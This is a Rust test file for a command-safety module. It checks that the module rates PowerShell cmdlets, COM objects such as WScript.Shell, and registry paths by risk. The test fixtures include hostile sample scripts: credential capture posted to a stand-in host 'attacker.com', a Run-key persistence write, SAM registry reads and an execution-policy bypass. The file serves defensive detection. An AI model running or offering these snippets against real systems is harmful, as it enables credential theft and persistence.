//! Phase 6.4: Windows/PowerShell Integration Tests
//!
//! Comprehensive tests for Phase 6 Windows security enhancements.

#[cfg(test)]
#[cfg(windows)]
mod tests {
    use crate::command_safety::{
        CmdletDatabase, CmdletSeverity, ComObjectAnalyzer, ComRiskLevel, RegistryAccessFilter,
        RegistryRiskLevel,
    };

    // ========== Cmdlet Database Tests ==========

    #[test]
    fn test_critical_cmdlets_database() {
        // Verify critical cmdlets are in database
        let invoke_expr = CmdletDatabase::get_info("invoke-expression").unwrap();
        assert_eq!(invoke_expr.severity, CmdletSeverity::Critical);

        let invoke_cmd = CmdletDatabase::get_info("invoke-command").unwrap();
        assert_eq!(invoke_cmd.severity, CmdletSeverity::Critical);

        let new_service = CmdletDatabase::get_info("new-service").unwrap();
        assert_eq!(new_service.severity, CmdletSeverity::Critical);
    }

    #[test]
    fn test_high_severity_cmdlets() {
        let wmi = CmdletDatabase::get_info("invoke-wmimethod").unwrap();
        assert_eq!(wmi.severity, CmdletSeverity::High);

        let start_proc = CmdletDatabase::get_info("start-process").unwrap();
        assert_eq!(start_proc.severity, CmdletSeverity::High);
    }

    #[test]
    fn test_cmdlet_dangerous_patterns() {
        let invoke_expr = CmdletDatabase::get_info("invoke-expression").unwrap();
        assert!(invoke_expr.dangerous_patterns.contains(&"iex"));
        assert!(invoke_expr.dangerous_patterns.contains(&"invoke-expression"));
    }

    #[test]
    fn test_cmdlet_category_filtering() {
        let code_exec = CmdletDatabase::get_by_category(
            crate::command_safety::CmdletCategory::CodeExecution,
        );
        assert!(!code_exec.is_empty());
        assert!(code_exec
            .iter()
            .any(|c| c.name.to_lowercase().contains("invoke")));
    }

    #[test]
    fn test_cmdlet_severity_filtering() {
        let critical = CmdletDatabase::get_by_severity(CmdletSeverity::Critical);
        assert!(!critical.is_empty());

        let high = CmdletDatabase::get_by_severity(CmdletSeverity::High);
        assert!(!high.is_empty());

        // Critical should be larger than low
        let low = CmdletDatabase::get_by_severity(CmdletSeverity::Low);
        assert!(critical.len() < high.len() + critical.len());
    }

    #[test]
    fn test_cmdlet_severity_threshold() {
        // invoke-expression (CRITICAL) exceeds HIGH threshold
        assert!(CmdletDatabase::is_above_threshold(
            "invoke-expression",
            CmdletSeverity::High
        ));

        // get-content (LOW) does not exceed LOW threshold
        assert!(!CmdletDatabase::is_above_threshold(
            "get-content",
            CmdletSeverity::Low
        ));
    }

    // ========== COM Object Analyzer Tests ==========

    #[test]
    fn test_critical_com_objects() {
        let shell = ComObjectAnalyzer::get_object_info("wscript.shell").unwrap();
        assert_eq!(shell.risk_level, ComRiskLevel::Critical);

        let shell_app = ComObjectAnalyzer::get_object_info("shell.application").unwrap();
        assert_eq!(shell_app.risk_level, ComRiskLevel::Critical);
    }

    #[test]
    fn test_com_object_dangerous_methods() {
        let shell = ComObjectAnalyzer::get_object_info("wscript.shell").unwrap();
        assert!(shell.dangerous_methods.contains(&"exec"));
        assert!(shell.dangerous_methods.contains(&"run"));
    }

    #[test]
    fn test_com_instantiation_detection() {
        let script = r#"
            $shell = New-Object -ComObject WScript.Shell
            $shell.Run("calc.exe")
        "#;

        let contexts = ComObjectAnalyzer::analyze_instantiation(script);
        assert!(!contexts.is_empty());

        let ctx = &contexts[0];
        assert_eq!(ctx.risk_level, ComRiskLevel::Critical);
        assert!(ctx.dangerous_methods_used.iter().any(|m| m.contains("run")));
    }

    #[test]
    fn test_com_critical_detection() {
        let dangerous = "New-Object -ComObject WScript.Shell";
        assert!(ComObjectAnalyzer::has_critical_com_objects(dangerous));

        let safe = "Get-Item -Path C:\\";
        assert!(!ComObjectAnalyzer::has_critical_com_objects(safe));
    }

    #[test]
    fn test_com_max_risk_level() {
        let script = r#"
            $shell = New-Object -ComObject WScript.Shell
            $xml = New-Object -ComObject Microsoft.XMLDOM
        "#;

        let max_risk = ComObjectAnalyzer::get_max_risk_level(script);
        assert!(max_risk >= ComRiskLevel::Critical);
    }

    #[test]
    fn test_com_dangerous_usage_with_invocation() {
        let dangerous = r#"
            $shell = New-Object -ComObject WScript.Shell
            $shell.Run($command) | iex
        "#;

        assert!(ComObjectAnalyzer::is_dangerous_com_usage(dangerous));
    }

    #[test]
    fn test_com_filesystem_object() {
        let script = "New-Object -ComObject Scripting.FileSystemObject";
        let contexts = ComObjectAnalyzer::analyze_instantiation(script);
        assert!(!contexts.is_empty());
        assert_eq!(contexts[0].risk_level, ComRiskLevel::High);
    }

    #[test]
    fn test_com_activex_object_variant() {
        let script = "[activexobject]'WScript.Shell'";
        let contexts = ComObjectAnalyzer::analyze_instantiation(script);
        assert!(!contexts.is_empty());
        assert_eq!(contexts[0].creation_method, "[ActiveXObject] cast");
    }

    // ========== Registry Access Filter Tests ==========

    #[test]
    fn test_critical_registry_paths() {
        let run = RegistryAccessFilter::get_path_info("run").unwrap();
        assert_eq!(run.risk_level, RegistryRiskLevel::Critical);

        let services = RegistryAccessFilter::get_path_info("services").unwrap();
        assert_eq!(services.risk_level, RegistryRiskLevel::Critical);

        let sam = RegistryAccessFilter::get_path_info("sam").unwrap();
        assert_eq!(sam.risk_level, RegistryRiskLevel::Critical);
    }

    #[test]
    fn test_high_risk_registry_paths() {
        let defender = RegistryAccessFilter::get_path_info("defender").unwrap();
        assert_eq!(defender.risk_level, RegistryRiskLevel::High);

        let policies = RegistryAccessFilter::get_path_info("policies").unwrap();
        assert_eq!(policies.risk_level, RegistryRiskLevel::High);
    }

    #[test]
    fn test_registry_access_detection() {
        let script = "Get-Item -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        let patterns = RegistryAccessFilter::analyze_registry_access(script);
        assert!(!patterns.is_empty());
    }

    #[test]
    fn test_registry_write_detection() {
        let script = "Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\Run -Value malware.exe";
        let patterns = RegistryAccessFilter::analyze_registry_access(script);
        assert!(!patterns.is_empty());
        assert!(patterns[0].is_write_operation);
    }

    #[test]
    fn test_dangerous_registry_access() {
        let dangerous = "Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\*";
        assert!(RegistryAccessFilter::is_dangerous_registry_access(dangerous));

        let safe = "Get-Item -Path HKCU:\\Software";
        assert!(!RegistryAccessFilter::is_dangerous_registry_access(safe));
    }

    #[test]
    fn test_registry_max_risk() {
        let script = r#"
            Get-Item HKLM:\\Run
            Set-Item HKCU:\\SAM
        "#;

        let max_risk = RegistryAccessFilter::get_max_registry_risk(script);
        assert_eq!(max_risk, RegistryRiskLevel::Critical);
    }

    #[test]
    fn test_registry_risk_filtering() {
        let script = r#"
            Get-Item HKLM:\\Run
            Get-Item HKCU:\\Environment
        "#;

        let medium_risk =
            RegistryAccessFilter::filter_by_risk_level(script, RegistryRiskLevel::Medium);
        assert!(!medium_risk.is_empty());
    }

    // ========== Complex Integration Tests ==========

    #[test]
    fn test_combined_com_and_registry_attack() {
        let script = r#"
            $shell = New-Object -ComObject WScript.Shell
            $shell.RegRead("HKEY_LOCAL_MACHINE\SAM\...")
            $shell.Run("cmd.exe /c ...")
        "#;

        // Should detect COM critical risk
        assert!(ComObjectAnalyzer::has_critical_com_objects(script));

        // Should detect registry access
        let registry_patterns = RegistryAccessFilter::analyze_registry_access(script);
        assert!(!registry_patterns.is_empty());
    }

    #[test]
    fn test_credential_theft_scenario() {
        let script = r#"
            $outlook = New-Object -ComObject Outlook.Application
            $cred = Get-Credential
            $xml = New-Object -ComObject Microsoft.XMLHTTP
            $xml.Open("POST", "http://attacker.com/steal", $false)
        "#;

        // Should detect multiple high-risk patterns
        assert!(ComObjectAnalyzer::get_max_risk_level(script) >= ComRiskLevel::High);

        let cmdlets_mentioned = script.to_lowercase().contains("get-credential");
        assert!(cmdlets_mentioned);
    }

    #[test]
    fn test_persistence_vector() {
        let script = r#"
            $shell = New-Object -ComObject WScript.Shell
            New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run `
                -Name "Malware" -Value "powershell.exe -Command ..."
        "#;

        // Should detect critical COM object
        assert!(ComObjectAnalyzer::has_critical_com_objects(script));

        // Should detect dangerous registry write
        assert!(RegistryAccessFilter::is_dangerous_registry_access(script));
    }

    #[test]
    fn test_escalation_pattern() {
        let script = r#"
            Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
            Get-WmiObject Win32_UserAccount | Set-WmiInstance ...
        "#;

        // Should detect dangerous cmdlet (Set-ExecutionPolicy)
        let set_exec_policy = CmdletDatabase::get_info("set-executionpolicy").unwrap();
        assert_eq!(set_exec_policy.severity, CmdletSeverity::High);
    }

    // ========== Case Sensitivity Tests ==========

    #[test]
    fn test_cmdlet_case_insensitivity() {
        assert!(CmdletDatabase::get_info("INVOKE-EXPRESSION").is_some());
        assert!(CmdletDatabase::get_info("Invoke-Expression").is_some());
        assert!(CmdletDatabase::get_info("invoke-expression").is_some());
    }

    #[test]
    fn test_com_case_insensitivity() {
        assert!(ComObjectAnalyzer::get_object_info("WSCRIPT.SHELL").is_some());
        assert!(ComObjectAnalyzer::get_object_info("WScript.Shell").is_some());
        assert!(ComObjectAnalyzer::get_object_info("wscript.shell").is_some());
    }

    #[test]
    fn test_registry_case_insensitivity() {
        assert!(RegistryAccessFilter::get_path_info("RUN").is_some());
        assert!(RegistryAccessFilter::get_path_info("Run").is_some());
        assert!(RegistryAccessFilter::get_path_info("run").is_some());
    }

    // ========== Edge Cases ==========

    #[test]
    fn test_unknown_cmdlet() {
        assert!(CmdletDatabase::get_info("unknown-cmdlet").is_none());
    }

    #[test]
    fn test_empty_script_analysis() {
        assert!(ComObjectAnalyzer::analyze_instantiation("").is_empty());
        assert!(RegistryAccessFilter::analyze_registry_access("").is_empty());
    }

    #[test]
    fn test_benign_script() {
        let safe = r#"
            Get-ChildItem -Path C:\Users
            Write-Host "Files listed"
            [System.Math]::Round(3.14)
        "#;

        assert!(!ComObjectAnalyzer::has_critical_com_objects(safe));
        assert!(!RegistryAccessFilter::is_dangerous_registry_access(safe));
    }

    // ========== Performance Tests ==========

    #[test]
    fn test_large_script_performance() {
        let mut large_script = String::new();
        for i in 0..1000 {
            large_script.push_str(&format!("Write-Host 'Line {}'\n", i));
        }

        // Should complete quickly
        let _patterns = RegistryAccessFilter::analyze_registry_access(&large_script);
        let _contexts = ComObjectAnalyzer::analyze_instantiation(&large_script);

        // No assertions needed, just verify no panics
    }

    #[test]
    fn test_cmdlet_database_access_speed() {
        // Database should respond quickly
        for i in 0..100 {
            let _ = CmdletDatabase::get_info(&format!("invoke-expression-{}", i));
        }
    }
}
